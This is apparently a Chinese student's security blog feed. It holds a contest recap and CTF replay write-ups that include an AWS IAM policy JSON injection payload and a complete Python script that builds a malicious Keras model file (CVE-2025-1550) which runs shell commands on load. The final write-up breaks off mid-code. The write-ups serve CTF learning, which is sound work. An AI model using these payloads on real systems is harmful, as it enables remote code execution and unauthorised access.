    <url>/2025/10/18/%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="2025京津冀大学生网络安全攻防竞赛-线下赛"><a href="#2025京津冀大学生网络安全攻防竞赛-线下赛" class="headerlink" title="2025京津冀大学生网络安全攻防竞赛 线下赛"></a>2025京津冀大学生网络安全攻防竞赛 线下赛</h1><p>满是槽点的比赛。。。</p><p>首先是前半场 DAWD 的电源供应不稳定，属于是有停20分钟，来时分钟电，一时有一时无的。这也是’真实性’的一环是吧。。。</p><p><img src="/../img/xianxiasai/160376784699372f720385700c9c0668.jpg"><br><img src="/../img/xianxiasai/6799dfb821289ec2d4dafaa5d2a3c183.jpg"></p><p>然后是后面的应急响应环节，由于可能类似是novnc的那种操作，一台节点机子全队共用，常常出现：<br>“学长你别敲了，让我输一下我的指令！”<br>“等等等等，我马上就好了，别动别敲了，字符叠在一起了！”</p><p>这种情况。。。</p><p>这次我队GWWAFZ</p><p>DWAD环节成绩：<br><img src="/img/xianxiasai/1773f539-2941-4817-97a9-435898e79fec.png"></p><p>其中我为web手<br>第二回合期间写出了meiu的exp攻击脚本，开始拿分。<br>然后一直到第8回合，在最后一轮判断前整出otrix的exp，最后再拿了305分。<br>没有写出防御patch。。。</p><p>最后DAWD排名为16名！</p><p>算是逆袭吧<br>因为当初我们是卡着最后一名晋级的。</p><p>只有两个pwn和web两个方向，我们pwn方向并未写出exp或patch</p><p>接下来的应急响应被干到了40多名</p><p>但是有37队左右拿奖，却并没有我们？！<br>连三等奖都没有</p><p>事后我们导师私了一下奇安信的人员，只能说毕竟是客场作战，，，<br>主办和协办又是出钱出力的，人情世故这一块。。。</p><p>若是另一道web题提前一两回合出的话，要是我的应急响应能力能再强一点的话。。。</p><p>哎</p><h2 id="web2-meiu"><a href="#web2-meiu" class="headerlink" title="web2 meiu:"></a>web2 meiu:</h2><p>用d盾能直接扫出来在自定义的404界面直接有后门，直接利用即可<br>赛后讨论应该是有两个地方可以利用的，赛时没找到，直接就打，发现大多数人是没防住的，就不管了</p><h2 id="web1-otrix"><a href="#web1-otrix" class="headerlink" title="web1 otrix:"></a>web1 otrix:</h2><p>app.py就很明显有反序列化，利用方面出了点问题，最后是使用了其他队的流量来打出利用exp的</p><h2 id="这次赛题的总结："><a href="#这次赛题的总结：" class="headerlink" title="这次赛题的总结："></a>这次赛题的总结：</h2><p>因为我不是pwn手，对pwn不做评价，但是web方向的漏洞都算是比较轻松。主要是难在编写exp和patch上，算是没接触的赛制，当然，有ai的话就不是大问题，看平常的积累了，不单只ctf方向，而是各自脚本的使用和一些基本知识。<br>对的这次比赛是能联网的。</p><p>总的来说，个人感觉这次的比赛体验不是很好，但也算去接触了一下这种，奇安信自研的，DAWD。<br>通过选手是无法得知相互ip的，设置有题目机和npc机子，操作机。<br>编写全自动脚本，通过操作机来执行，题目通过端口映射来测试exp，源码都给了，最后是稍稍有点可惜了，幸好学校全报销费用。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>近期的感觉</title>
    <link href="/2025/10/07/%E8%BF%91%E6%9C%9F%E7%9A%84%E6%84%9F%E8%A7%89/"/>
    <url>/2025/10/07/%E8%BF%91%E6%9C%9F%E7%9A%84%E6%84%9F%E8%A7%89/</url>
    
    <content type="html"><![CDATA[<h1 id="接下来——"><a href="#接下来——" class="headerlink" title="接下来——"></a>接下来——</h1><p>近期一直在复现一些比赛的题目，  </p><p>深刻感受到了自己的弱小   </p><p>感觉想要进一步学习就避免不了要审计。  </p><p>目前对这些框架和中间件很头痛。<br>自己是没有完整的web开发经验的，感觉没有开发基础很难继续深入了，<br>最近在复现SECCON13的题目时就要一直审计源码，这时才发现自己其实并没有能完整审计一个项目的能力，<br>没有开发经验，只能看懂片段代码，在比赛做题时需大量借助ai协助审计，属于是见过类似的题就能掰扯掰扯。<br>没见过就难自己做出来，甚至看都看不懂。<br>目前这个状态，卡在这不知道怎么办了。    </p><p>感觉接下来就是：<br>选项一：仔细研读源码和wp，在学习题目中学会审计<br>选项二：自己尝试写一些ctf题目向的小小项目来学习代码基础   </p><p>代码关还是得过的，不知道得在这耗多久。<br>真想成为一名真正的web手啊。</p>]]></content>
    
    
    
    <tags>
      
      <tag>selftalk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>D3^CTF复现学习</title>
    <link href="/2025/10/07/D3-CTF%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/10/07/D3-CTF%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="D3-CTF-复现学习："><a href="#D3-CTF-复现学习：" class="headerlink" title="D3^CTF 复现学习："></a>D3^CTF 复现学习：</h1><h2 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h2><p>考点： AWS IAM（Identity and Access Management）策略 json 注入</p><p>看官方wp和问ai很清楚了，</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br>由于session_token里的可访问内容是可由用户控制的，所以能用文件名来控制session_token  <br><br>实现注入访问  <br><br>注意在json里要包含双引号的话要用\来转义  如 <span class="hljs-string">&quot;\</span><br><br>接下来使用这个 STS 临时凭证访问 MinIO 的 api 接口即可拿到 flag<br><br>进行访问为例<br><br></code></pre></td></tr></table></figure><p>问题是我不会用mc连接</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-string">&quot;*\&quot; ]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:*\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::*&quot;</span><br><br></code></pre></td></tr></table></figure><p>在json中要添加双引号字符需要用\来转义</p><h2 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h2><p>这题docker搭出来有问题，直接看官方wp吧：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>解题的关键在于工具类 <span class="hljs-keyword">Backup </span>所使用的 <span class="hljs-keyword">jtar </span>打包库。在使用<br><br><span class="hljs-keyword">jtar </span>的 TarOutputStream 打包文件时，它会把文件名中的 unicode 强制转化为 ascii 码，<br><br>从而发生字符截断。利用这一点，我们可以将后缀带有特定 unicode 字符的文件上传<br><br>至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为 <span class="hljs-keyword">jsp </span>后缀的文<br><br>件并放回 <span class="hljs-keyword">jsp </span>可解析目录，最终 RCE 获取 flag<br><br></code></pre></td></tr></table></figure><h2 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h2><p>考点：Keras 模型文件的安全性问题</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> keras<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br><span class="hljs-keyword">import</span> os<br><br><br><br>defis_valid_model(modelname):<br><br>    <span class="hljs-keyword">try</span>:<br><br>        keras.models.load_model(modelname)<br><br>    <span class="hljs-keyword">except</span>:<br><br>        returnFalse<br><br>    returnTrue<br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br>defindex():<br><br>    returnopen(<span class="hljs-string">&#x27;index.html&#x27;</span>).read()<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><br>defupload_file():<br><br>    <span class="hljs-keyword">if</span><span class="hljs-string">&#x27;file&#x27;</span>notin request.files:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;No file part&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>  <br><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>  <br><br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;No selected file&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>  <br><br>    MAX_FILE_SIZE = <span class="hljs-number">50</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment"># 50MB</span><br><br>    file.seek(<span class="hljs-number">0</span>, os.SEEK_END)<br><br>    file_size = file.tell()<br><br>    file.seek(<span class="hljs-number">0</span>)<br><br>  <br><br>    <span class="hljs-keyword">if</span> file_size &gt; MAX_FILE_SIZE:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>  <br><br>    filepath = os.path.join(<span class="hljs-string">&#x27;./&#x27;</span>, <span class="hljs-string">&#x27;test.keras&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> os.path.exists(filepath):<br><br>        os.remove(filepath)<br><br>    file.save(filepath)<br><br>  <br><br>    <span class="hljs-keyword">if</span> is_valid_model(filepath):<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Model is valid&#x27;</span>&#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br><br>if__name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>没接触过</p><p>但是原理wp上给了：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>此题目基于 CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">1550</span>.<br><br>当调用函数 keras<span class="hljs-selector-class">.models</span><span class="hljs-selector-class">.load_model</span> 加载恶意 keras 文件时，其中特殊构造的<br><br>config<span class="hljs-selector-class">.json</span> 可以触发 RCE (Remote Code Execution).<br><br></code></pre></td></tr></table></figure><p>上网找exp即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">from</span> keras.models <span class="hljs-keyword">import</span> Sequential<br><br><span class="hljs-keyword">from</span> keras.layers <span class="hljs-keyword">import</span> Dense<br><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br>model_name = <span class="hljs-string">&quot;test.keras&quot;</span><br><br><br>x_train = np.random.rand(<span class="hljs-number">100</span>, <span class="hljs-number">28</span> * <span class="hljs-number">28</span>)<br><br>y_train = np.random.rand(<span class="hljs-number">100</span>)<br><br><br>model = Sequential([Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">&#x27;linear&#x27;</span>, input_dim=<span class="hljs-number">28</span> * <span class="hljs-number">28</span>)])<br><br><br>model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>, loss=<span class="hljs-string">&#x27;mse&#x27;</span>)<br><br>model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>)<br><br>model.save(model_name)<br><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(model_name, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br><br>    config = json.loads(f.read(<span class="hljs-string">&quot;config.json&quot;</span>).decode())<br><br><br>config[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;module&quot;</span>] = <span class="hljs-string">&quot;keras.models&quot;</span><br><br>config[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;class_name&quot;</span>] = <span class="hljs-string">&quot;Model&quot;</span><br><br>config[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;config&quot;</span>] = &#123;<br><br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br><br>    <span class="hljs-string">&quot;layers&quot;</span>: [<br><br>        &#123;<br><br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br><br>            <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br><br>            <span class="hljs-string">&quot;config&quot;</span>: <span class="hljs-string">&quot;Popen&quot;</span>,<br><br>            <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;subprocess&quot;</span>,<br><br>            <span class="hljs-string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="hljs-string">&quot;args&quot;</span>: [[<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;env&gt;&gt;index.html&quot;</span>]], <span class="hljs-string">&quot;kwargs&quot;</span>: &#123;<span class="hljs-string">&quot;bufsize&quot;</span>: -<span class="hljs-number">1</span>&#125;&#125;]<br><br>        &#125;],<br><br>    <span class="hljs-string">&quot;input_layers&quot;</span>: [[<span class="hljs-string">&quot;mvlttt&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]],<br><br>    <span class="hljs-string">&quot;output_layers&quot;</span>: [[<span class="hljs-string">&quot;mvlttt&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br><br>&#125;<br><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(model_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_read:<br><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">f&quot;tmp.<span class="hljs-subst">&#123;model_name&#125;</span>&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zip_write:<br><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> zip_read.infolist():<br><br>            <span class="hljs-keyword">if</span> item.filename != <span class="hljs-string">&quot;config.json&quot;</span>:<br><br>                zip_write.writestr(item, zip_read.read(item.filename))<br><br><br>os.remove(model_name)<br><br>os.rename(<span class="hljs-string">f&quot;tmp.<span class="hljs-subst">&#123;model_name&#125;</span>&quot;</span>, model_name)<br><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(model_name, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> zf:<br><br>    zf.writestr(<span class="hljs-string">&quot;config.json&quot;</span>, json.dumps(config))<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Malicious model ready&quot;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF2025复现学习</title>
    <link href="/2025/10/07/ACTF2025%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/10/07/ACTF2025%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2025-WEB-复现"><a href="#ACTF2025-WEB-复现" class="headerlink" title="ACTF2025 WEB 复现"></a>ACTF2025 WEB 复现</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>忍不住看了眼wp，知道了path可以任意文件读取</p><p>然后读到了 ..&#x2F;app.py 然后叫ai注释了一下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># 导入所需模块</span><br><br><span class="hljs-keyword">import</span> uuid          <span class="hljs-comment"># 用于生成唯一文件名，防止文件名冲突</span><br><br><span class="hljs-keyword">import</span> os            <span class="hljs-comment"># 用于操作系统相关操作（如读取环境变量、执行系统命令）</span><br><br><span class="hljs-keyword">import</span> hashlib       <span class="hljs-comment"># 用于密码哈希（SHA256）</span><br><br><span class="hljs-keyword">import</span> base64        <span class="hljs-comment"># 用于将二进制数据编码为 Base64 字符串，便于在 HTML 中嵌入图像</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, url_for, flash, session  <span class="hljs-comment"># Flask Web 框架核心组件</span><br><br><br><span class="hljs-comment"># 创建 Flask 应用实例</span><br><br>app = Flask(__name__)<br><br><br><span class="hljs-comment"># 设置 Flask 的 secret_key，用于加密 session。从环境变量中读取，若未设置则为 None（存在安全隐患）</span><br><br>app.secret_key = os.getenv(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>)<br><br><br><span class="hljs-comment"># 根路径路由：根据用户是否已登录，重定向到上传页或登录页</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><br>defindex():<br><br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):  <span class="hljs-comment"># 如果 session 中存在用户名，说明已登录</span><br><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;upload&#x27;</span>))  <span class="hljs-comment"># 跳转到上传页面</span><br><br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))   <span class="hljs-comment"># 否则跳转到登录页面</span><br><br><br><span class="hljs-comment"># 登录路由：支持 GET（显示表单）和 POST（处理登录）</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br>deflogin():<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        <span class="hljs-comment"># 从表单中获取用户名和密码</span><br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br><br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br>      <br><br>        <span class="hljs-comment"># 特殊处理用户名为 &#x27;admin&#x27; 的情况</span><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br><br>            <span class="hljs-comment"># 对输入密码进行 SHA256 哈希，并与硬编码的哈希值比对</span><br><br>            <span class="hljs-keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="hljs-string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:<br><br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = username  <span class="hljs-comment"># 登录成功，设置 session</span><br><br>                <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>            <span class="hljs-keyword">else</span>:<br><br>                flash(<span class="hljs-string">&#x27;Invalid password&#x27;</span>)  <span class="hljs-comment"># 密码错误，提示用户</span><br><br>        <span class="hljs-keyword">else</span>:<br><br>            <span class="hljs-comment"># 非 admin 用户：无需密码验证，直接登录（任意用户名均可）</span><br><br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-comment"># GET 请求：返回登录表单 HTML</span><br><br>        <span class="hljs-keyword">return</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        